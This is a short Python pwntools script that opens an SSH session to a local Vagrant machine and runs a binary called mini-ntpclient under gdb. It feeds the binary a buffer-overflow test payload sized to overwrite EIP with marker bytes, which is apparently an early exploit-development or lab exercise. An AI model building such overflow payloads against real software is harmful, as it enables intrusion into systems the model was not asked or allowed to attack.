from pwn import *
import base64

context.update(arch='i386', os='linux')

# Connect to the server with SSH
ssh_connection = ssh('vagrant', 'default', port=2222)

# Open a shell to write more stuff to
bash = ssh_connection.run('bash')

#crash_at = 0x12c

crash_at = 264
eip_crash = 0x61616663
eip_crash_buffer = cyclic_find(eip_crash)

# Create a test payload which writes up to the EIP with A's, writes over the EIP with B's and then writes C's
payload = 'A' * eip_crash_buffer + ('B' * 4) + ('C' * (crash_at - eip_crash_buffer - 4))

# Send the payload
bash.sendline('gdb /vagrant/mini-ntpclient')
bash.sendline('run '+ str(payload))
# Hand an interactive shell back to the user
bash.interactive()
